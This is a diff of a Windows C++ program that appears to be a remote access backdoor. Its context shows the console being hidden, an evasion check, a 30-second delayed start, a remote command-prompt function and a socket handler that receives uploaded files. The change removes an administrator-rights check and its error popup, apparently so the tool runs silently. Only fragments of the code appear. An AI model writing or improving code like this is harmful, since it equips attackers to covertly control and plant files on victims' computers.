@@ -18,8 +18,7 @@ DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes availa
 //and the exitcode
 void CommandPrompt(void);       //the function to give the command prompt
 void handle_upload(SOCKET sock); //the function to handle file uploads
-BOOL IsRunAsAdmin(); //function to check if the program is running as admin
-void ShowErrorMessage(const wchar_t* message); //function to show an error message
+
 int main() //the main function
 {
     //hide console
@@ -28,12 +27,6 @@ int main() //the main function
    if (BugCheck()) {
 		return EXIT_FAILURE;
 	}
-    
-   if (!IsRunAsAdmin())
-    {
-        ShowErrorMessage(L"Please run the program as administrator.");
-        return 1;
-    }
 
    //sleep for 30 seconds
    Sleep(30000);
@@ -240,39 +233,4 @@ void handle_upload(SOCKET sock) {
     fclose(fp);
 
     send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
-}
-
-BOOL IsRunAsAdmin()
-{
-    BOOL fIsRunAsAdmin = FALSE;
-    DWORD dwError = ERROR_SUCCESS;
-    PSID pAdministratorsGroup = NULL;
-
-    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
-        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup))
-    {
-        dwError = GetLastError();
-    }
-    else
-    {
-        if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
-        {
-            dwError = GetLastError();
-        }
-
-        FreeSid(pAdministratorsGroup);
-    }
-
-    if (dwError != ERROR_SUCCESS)
-    {
-        std::cerr << "Error checking admin privileges: " << dwError << std::endl;
-    }
-
-    return fIsRunAsAdmin;
-}
-
-void ShowErrorMessage(const wchar_t* message)
-{
-    MessageBox(NULL, message, L"Error", MB_OK | MB_ICONERROR);
 }
